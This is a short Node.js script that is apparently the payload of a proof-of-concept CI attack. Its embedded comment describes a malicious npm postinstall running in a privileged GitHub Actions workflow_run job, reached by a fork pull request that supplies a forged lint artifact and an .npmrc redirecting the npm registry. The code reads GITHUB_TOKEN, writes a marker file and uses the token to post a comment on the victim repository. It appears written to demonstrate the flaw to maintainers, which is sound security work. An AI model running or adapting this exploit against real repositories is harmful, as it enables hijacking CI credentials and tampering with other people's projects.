const fs = require('fs');
const path = require('path');

function findPRNumber() {
  let dir = process.cwd();
  for (let i = 0; i < 6; i++) {
    const p = path.join(dir, 'pr-number.txt');
    try {
      if (fs.existsSync(p)) {
        const v = fs.readFileSync(p, 'utf8').trim();
        if (/^\d+$/.test(v)) return v;
      }
    } catch (e) {}
    dir = path.dirname(dir);
  }
  return '1';
}

(async () => {
  const token = process.env.GITHUB_TOKEN;
  const repo = process.env.GITHUB_REPOSITORY || 'unknown/none';
  const marker = 'GAB-ADP-RCE-' + Date.now() + '-' + Math.floor(Math.random() * 1e6);
  const pr = findPRNumber();
  console.log('RCE_EXEC marker=' + marker + ' token=' + (token ? 'present' : 'absent') + ' repo=' + repo + ' pr=' + pr);
  fs.writeFileSync('/tmp/ADP_RCE_MARKER', marker);
  if (token) {
    try {
      const r = await fetch('https://api.github.com/repos/' + repo + '/issues/' + pr + '/comments', {
        method: 'POST',
        headers: {
          'Accept': 'application/vnd.github+json',
          'Authorization': 'Bearer ' + token,
          'Content-Type': 'application/json',
          'X-GitHub-Api-Version': '2022-11-28'
        },
        body: JSON.stringify({ body: '### GAB ADP RCE PoC\n\nmarker: `' + marker + '`\n\nThis comment was written by `GITHUB_TOKEN` from inside a malicious npm `postinstall` that ran in the privileged `workflow_run` job ("Post Linter Report"). Trigger: a fork PR supplying a forged `Lint` workflow/artifact. `.npmrc` in the downloaded artifact redirected the npm registry.\n\ntoken: ' + (token ? 'present' : 'absent') + '\nrepo: ' + repo })
      });
      console.log('comment_status=' + r.status);
    } catch (e) { console.log('comment_err=' + e.message); }
  }
})();
